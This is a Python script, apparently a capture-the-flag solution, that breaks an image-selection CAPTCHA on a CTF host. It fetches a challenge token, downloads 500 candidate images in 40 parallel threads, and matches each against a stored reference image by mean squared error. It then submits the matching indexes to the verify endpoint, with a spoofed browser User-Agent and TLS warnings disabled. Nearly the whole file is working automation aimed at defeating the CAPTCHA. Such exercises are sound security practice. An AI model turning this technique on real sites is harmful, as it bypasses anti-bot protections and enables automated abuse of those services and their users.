import requests, concurrent.futures, threading, sys, signal
import time
from urllib3.exceptions import InsecureRequestWarning
import cv2
import numpy as np


requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
hss ={"User-Agent":"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:107.0) Gecko/20100101 Firefox/107.0"}

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class Counter(object):
    def __init__(self):
        self.lock = threading.Lock()
        self.num = 0

    def increment(self, n=1):
        with self.lock:
            self.num += n

    def getValue(self):
        return self.num

def wait_threads():
    threads_running = True
    while threads_running:
        threads_running = False
        for future in results:
            if not future.done():
                threads_running = True
                break
        time.sleep(2)    

def sig_handler(signum, frame):
    for future in results:
        future.cancel()

    time.sleep(2)
    print(bcolors.WARNING+"\n\n [*] CTRL+C Received"+bcolors.ENDC)
    print(bcolors.OKGREEN+"\n [*] Waiting for threads to complete"+bcolors.ENDC)
    wait_threads()
    print(bcolors.OKGREEN+"\n [*] All Done!\n"+bcolors.ENDC)
    sys.exit(0)
    

def Action(uri,token,idx):
    try:
        counter.increment()
        target = uri + str(idx) + "&token=" + str(token)
        r = requests.request("GET",target,headers=hss,timeout=4)

        resim_data = r.content
        resim_yolu = "/home/mustyfa/correct.jpg"
        resim = cv2.imread(resim_yolu)
        indirilen_resim = np.asarray(bytearray(resim_data), dtype="uint8")
        indirilen_resim = cv2.imdecode(indirilen_resim, cv2.IMREAD_COLOR)
        griton_resim1 = cv2.cvtColor(indirilen_resim, cv2.COLOR_BGR2GRAY)
        griton_resim2 = cv2.cvtColor(resim, cv2.COLOR_BGR2GRAY)
        griton_resim1 = cv2.resize(griton_resim1, (75, 75))
        griton_resim2 = cv2.resize(griton_resim2, (75, 75))
        mse = np.mean((griton_resim1 - griton_resim2) ** 2)
        print(f"id: {idx}, mse: {mse}\n")
        if int(mse) <= 10:
            return {"message":"found","id":idx}
        else:
            return None
    except Exception as error:
        raise

if __name__ == "__main__":
    global results
    signal.signal(signal.SIGINT, sig_handler)
    counter=Counter()
        
    wordlist_size = 500
    found_count = 0
    
    url="http://keppche.stmctf.com/get-captcha-image/?index="

    r = requests.post("http://keppche.stmctf.com/generate-captcha-challenge",headers=hss,proxies={"http":"http://127.0.0.1:8080"})
    print(str(r.content))
    ax = str(r.content)
    token = ax[12:len(ax)-5]
    print(f"\n token alindi: {token}\n")
    bulunanlar = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=40) as executor:
        results = [executor.submit(Action, url, token, idx) for idx in range(0,500)]
        for future in concurrent.futures.as_completed(results):
            res = future.result()
            if res != None:
                msg=res["message"]
                _id=res["id"]
                bulunanlar.append(int(_id))
                print(f" [x] {msg} and id: {_id} ---> found of "+str(counter.getValue())+f"/{wordlist_size} \n",end="\r")

    print(f"\n  -----------------  BULUNANLAR: {bulunanlar}  ----------------- \n\n")
    bodi = {"selectedIndexes":bulunanlar,"token":token}
    r = requests.post("http://keppche.stmctf.com/verify-captcha",json=bodi,headers=hss)
    print("\n ----------------- SONUC --------------\n")
    print(r.content)
    print("\n ----------------- SONUC --------------\n")
